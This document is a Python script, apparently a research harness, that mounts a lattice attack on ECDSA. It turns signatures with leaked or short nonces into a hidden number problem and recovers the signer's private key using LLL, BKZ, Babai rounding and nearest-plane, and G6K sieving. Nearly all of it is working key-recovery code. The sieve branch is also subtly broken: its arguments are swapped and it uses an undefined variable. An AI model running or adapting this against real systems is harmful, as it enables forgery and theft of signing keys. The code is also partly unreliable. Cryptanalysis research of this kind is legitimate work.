#!/usr/bin/env python3

import csv
import hashlib
import json
import random
import sys
import time
from binascii import unhexlify
from collections import namedtuple
from copy import copy
from math import sqrt
from pprint import pprint
from threading import current_thread, Thread
from bisect import bisect

import numpy as np
from ec import get_curve, Mod
from fpylll import LLL, BKZ, IntegerMatrix, GSO
from g6k.siever import Siever, SaturationError
from numpy.linalg import inv as matrix_inverse

Signature = namedtuple("Signature", ("elapsed", "h", "t", "u", "r", "s", "sinv"))

DEFAULT_PARAMS = {
    "attack": {
        "method": "svp",
        "type": "random",
        "skip": 50,
        "num": 1000,
        "seed": None
    },
    "dimension": 90,
    "bounds": {},
    "betas": [15, 20, 30, 40, 45, 48, 51, 53, 55],
}


def construct_signature(curve, hash, data, r, s, elapsed):
    """Parse the signature into a Signature object."""
    h = hash.copy()
    h.update(data)
    data_hash = int(h.hexdigest(), 16)
    if h.digest_size * 8 > curve.group.n.bit_length():
        data_hash >>= h.digest_size * 8 - curve.group.n.bit_length()
    r = Mod(r, curve.group.n)
    s = Mod(s, curve.group.n)
    sinv = s.inverse()
    t = (sinv * r)
    u = (-sinv * data_hash)
    return Signature(elapsed, data_hash, int(t), int(u), int(r), int(s), int(sinv))


class Solver(Thread):
    """Solve the HNP given signatures and target pubkey."""

    def __init__(self, curve, signatures, full_signatures, pubkey, params, solution_func, privkey):
        super().__init__()
        self.curve = curve
        self.signatures = signatures
        self.full_signatures = full_signatures
        self.pubkey = pubkey
        self.params = params
        self.solution_func = solution_func
        self.privkey = privkey

    def bound_func(self, index, dim, bounds, recenter):
        return self.bounds[index] + (1 if recenter == "yes" else 0)

    def const_bound_func(self, bounds):
        return bounds["value"]

    def geom_bound_func(self, index, dim, bounds):
        max_bound = 0
        for part, bound in bounds["parts"].items():
            if index < dim / int(part) and max_bound < bound:
                max_bound = bound
        return max_bound

    def geomN_bound_func(self, index, N):
        Npart = N
        i = 1
        while Npart / (2 ** i) >= index + 1:
            i += 1
        i -= 1
        if i <= 1:
            return 0
        return i

    def known_bound_func(self, index, dim):
        return self.curve.group.n.bit_length() - int(
                self.recompute_nonce(self.signatures[index])).bit_length()

    def build_cvp_lattice(self, signatures, dim, bounds, recenter):
        b = IntegerMatrix(dim + 1, dim + 1)
        for i in range(dim):
            b[i, i] = (2 ** self.bound_func(i, dim, bounds, recenter)) * self.curve.group.n
            b[dim, i] = (2 ** self.bound_func(i, dim, bounds, recenter)) * signatures[i][0]
        b[dim, dim] = 1
        return b

    def build_svp_lattice(self, signatures, dim, bounds, recenter):
        re_value = self.curve.group.n if recenter == "yes" else 0
        b = IntegerMatrix(dim + 2, dim + 2)
        for i in range(dim):
            b[i, i] = (2 ** self.bound_func(i, dim, bounds, recenter)) * self.curve.group.n
            b[dim, i] = (2 ** self.bound_func(i, dim, bounds, recenter)) * signatures[i][0]
            b[dim + 1, i] = (2 ** self.bound_func(i, dim, bounds, recenter)) * signatures[i][1] + re_value
        b[dim, dim] = 1
        b[dim + 1, dim + 1] = self.curve.group.n
        return b

    def build_target(self, signatures, dim, bounds, recenter):
        re_value = self.curve.group.n if recenter == "yes" else 0
        return [(2 ** self.bound_func(i, dim, bounds, recenter)) * signatures[i][1] + re_value for i in
                range(dim)] + [0]

    def log(self, msg):
        print("[{}] {} [{}s]".format(self.thread_name, msg, int(time.time() - self.thread_start)))

    def reduce_lattice(self, lattice, block_size):
        if block_size is None:
            self.log("Start LLL.")
            return LLL.reduction(lattice)
        else:
            self.log("Start BKZ-{}.".format(block_size))
            return BKZ.reduction(lattice, BKZ.Param(block_size=block_size,
                                                    strategies=BKZ.DEFAULT_STRATEGY,
                                                    auto_abort=True))

    def vector_from_coeffs(self, coeffs, lattice):
        return tuple((IntegerMatrix.from_iterable(1, lattice.nrows,
                                                  map(lambda x: int(round(x)), coeffs)) * lattice)[
                         0])

    def babai_np(self, lattice, gso, target):
        self.log("Start Babai's Nearest Plane.")
        combs = gso.babai(target)
        return self.vector_from_coeffs(combs, lattice)

    def babai_round(self, lattice, target):
        self.log("Start Babai's Rounding.")
        b = np.empty((lattice.nrows, lattice.ncols), "f8")
        lattice.to_matrix(b)
        b = matrix_inverse(b)
        res = np.dot(target, b)
        return self.vector_from_coeffs(res, lattice)

    def _try_guess(self, guess, pubkey):
        if guess in self.tried or -guess in self.tried:
            return False
        self.tried.add(guess)
        pubkey_guess = guess * self.curve.g
        self.log("Guess: {}".format(hex(guess)))
        if pubkey == pubkey_guess:
            self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        guess = self.curve.group.n - guess
        pubkey_guess = guess * self.curve.g
        if pubkey == pubkey_guess:
            self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        return False

    def verify_sieve(self, lattice, lifts):
        for i, norm, coeffs in lifts:
            v  = self.vector_from_coeffs(lattice, coeffs)
            guess = v[-2] % self.curve.group.n
            if self._try_guess(guess, pubkey):
                return i, v
        return None

    def verify_shortest(self, lattice, pubkey):
        for i, row in enumerate(lattice):
            guess = row[-2] % self.curve.group.n
            if self._try_guess(guess, pubkey):
                return i, row
        return None

    def verify_closest(self, closest, pubkey):
        if closest is None:
            return False
        guess = closest[-1] % self.curve.group.n
        if self._try_guess(guess, pubkey):
            return closest
        return None

    def recompute_nonce(self, sig):
        hm = Mod(sig.h, self.curve.group.n)
        r = Mod(sig.r, self.curve.group.n)
        x = Mod(self.privkey, self.curve.group.n)
        hmrx = hm + r * x
        return Mod(sig.sinv, self.curve.group.n) * hmrx

    def norm(self, vector):
        norm = 0
        for e in vector:
            norm += e * e
        norm = sqrt(norm)
        return norm

    def dist(self, one, other):
        dist = 0
        for a, b in zip(one, other):
            dist += (a - b) ** 2
        dist = sqrt(dist)
        return dist

    def run(self):
        self.thread_name = current_thread().name
        if self.thread_name == "MainThread":
            self.thread_name = " "
        self.thread_start = time.time()
        self.tried = set()

        dim = self.params["dimension"]

        if self.params["bounds"]["type"] == "known":
            sigs = self.signatures
            self.signatures = []
            blens = []
            for sig in sigs:
                blen = int(self.recompute_nonce(sig)).bit_length()
                i = bisect(blens, blen)
                if i < dim:
                    blens.insert(i, blen)
                    self.signatures.insert(i, sig)
                if len(blens) > dim:
                    blens.pop()
                    self.signatures.pop()

        pairs = [(sig.t, sig.u) for sig in self.signatures[:dim]]
        nonces = []
        for sig in self.signatures[:dim]:
            nonces.append(int(self.recompute_nonce(sig)))
        real_bitlens = [nonce.bit_length() for nonce in nonces]
        real_infos = [self.curve.group.n.bit_length() - bitlen for bitlen in real_bitlens]
        real_info = sum(real_infos)

        if self.params["bounds"]["type"] == "constant":
            value = self.const_bound_func(self.params["bounds"])
            self.bounds = [value for _ in range(dim)]
        elif self.params["bounds"]["type"] == "geom":
            self.bounds = [self.geom_bound_func(i, dim, self.params["bounds"]) for i in range(dim)]
        elif self.params["bounds"]["type"] == "geomN":
            self.bounds = [self.geomN_bound_func(i, len(self.signatures)) for i in range(dim)]
        elif self.params["bounds"]["type"] == "known":
            self.bounds = [self.known_bound_func(i, dim) for i in range(dim)]
        elif self.params["bounds"]["type"] == "template":
            self.bounds = [0 for _ in range(dim)]
            templates = copy(self.params["bounds"])
            del templates["type"]
            for k, v in templates.items():
                for i in range(*v):
                    self.bounds[i] = self.curve.group.n.bit_length() - int(k)

        bnds = [self.bounds[i] for i in range(dim)]
        info = sum(bnds)
        overhead = info / self.curve.bit_size()
        self.log("Building lattice with {} bits of information (overhead {:.2f}).".format(info,
                                                                                          overhead))
        liars = 0
        bad_info = 0
        good_info = 0
        liarpos = []
        for i, real, our in zip(range(dim), real_infos, bnds):
            if real < our:
                liars += 1
                bad_info += real
                liarpos.append(str(i) + "@" + str(our - real))
            else:
                good_info += real
        self.log("Real info: {}".format(real_info))
        self.log("Liars: {}".format(liars))
        self.log("Good info: {}".format(good_info))
        self.log("Bad info: {}".format(bad_info))
        self.log("Liar positions: {}".format(";".join(liarpos)))

        self.svp = self.params["attack"]["method"] == "svp"
        self.sieve = self.params["attack"]["method"] == "sieve"
        self.np = self.params["attack"]["method"] == "np"
        self.round = self.params["attack"]["method"] == "round"

        if self.svp or self.sieve:
            lattice = self.build_svp_lattice(pairs, dim, self.params["bounds"], self.params["recenter"])
        elif self.np or self.round:
            lattice = self.build_cvp_lattice(pairs, dim, self.params["bounds"], self.params["recenter"])
            target = self.build_target(pairs, dim, self.params["bounds"], self.params["recenter"])
        else:
            self.log("Bad method: {}".format(self.params["attack"]["method"]))
            return

        if self.sieve:
            self.reduce_lattice(lattice, None)
            g6k = Siever(lattice)
            self.log("Start SIEVE.")
            g6k.initialize_local(0, 0, dim)
            try:
                g6k()
            except SaturationError as e:
                pass
            short = self.verify_sieve(lattice, g6k.best_lifts())
            if short is not None:
                i, res = short
                self.log("Result row: {}".format(i))
                norm = self.norm(res)
                self.log("Result normdist: {}".format(norm))
            return

        reds = [None] + self.params["betas"]
        for beta in reds:
            lattice = self.reduce_lattice(lattice, beta)
            gso = GSO.Mat(lattice)
            gso.update_gso()
            if self.svp:
                short = self.verify_shortest(lattice, self.pubkey)
                if short is not None:
                    i, res = short
                    self.log("Result row: {}".format(i))
                    norm = self.norm(res)
                    self.log("Result normdist: {}".format(norm))
                    break

            if self.round:
                closest = self.babai_round(lattice, target)
                if self.verify_closest(closest, self.pubkey):
                    dist = self.dist(closest, target)
                    self.log("Result normdist: {}".format(dist))
                    break

            if self.np:
                closest = self.babai_np(lattice, gso, target)
                if self.verify_closest(closest, self.pubkey) is not None:
                    dist = self.dist(closest, target)
                    self.log("Result normdist: {}".format(dist))
                    break


def parse_params(fname):
    try:
        with open(fname) as f:
            return json.load(f)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("curve", help="What curve was used.")
    parser.add_argument("hash", help="What hash algorithm was used.")
    parser.add_argument("sigfile", help="CSV signature output file name.")
    parser.add_argument(
            "-p",
            "--params",
            help="A JSON file specifying attack parameters.",
            dest="params",
            type=parse_params,
            default=DEFAULT_PARAMS,
    )
    args = parser.parse_args()

    curve = get_curve(args.curve)
    if curve is None:
        print("[x] No curve found:", args.curve)
        exit(1)
    try:
        hash = hashlib.new(args.hash)
    except ValueError:
        print("[x] No hash algorithm found:", args.hash)
        exit(1)

    print("[*] Using parameters:")
    pprint(args.params)

    print("[ ] Loading signatures.")
    with open(args.sigfile) as sigfile:
        fline = sigfile.readline()[:-1].split(" ")
        pub = unhexlify(fline[0])
        data = unhexlify(fline[1])
        pubkey = curve.decode_point(pub)
        privkey = int(fline[2], 16)

        reader = csv.reader(sigfile)
        signatures = [
            construct_signature(curve, hash, data, int(row[0], 16), int(row[1], 16), int(row[2]))
            for row in reader]
    print("[*] Loaded {} signatures.".format(len(signatures)))

    if args.params["attack"]["skip"] is not None:
        print("[*] Skipping first {} signatures.".format(args.params["attack"]["skip"]))
        signatures = signatures[args.params["attack"]["skip"]:]

    full_signatures = copy(signatures)

    if args.params["attack"]["type"] == "random" and args.params["attack"]["num"] < len(signatures):
        if args.params["attack"]["seed"] is None:
            seed = random.randint(0, 2 ** 40)
        else:
            seed = args.params["attack"]["seed"]
        print("[*] Random seed:", seed)
        random.seed(seed)
        signatures = random.sample(signatures, args.params["attack"]["num"])
    print("[*] Using {} signatures.".format(len(signatures)))

    found = False

    def solution(skey):
        global found
        found = True

    print("[ ] Starting attack.")
    signatures.sort()
    solver = Solver(curve, signatures, full_signatures, pubkey, args.params,
                    solution, privkey)
    try:
        solver.run()
    except KeyboardInterrupt:
        pass
    print("[*] Finished attack.")
    if not found:
        exit(1)
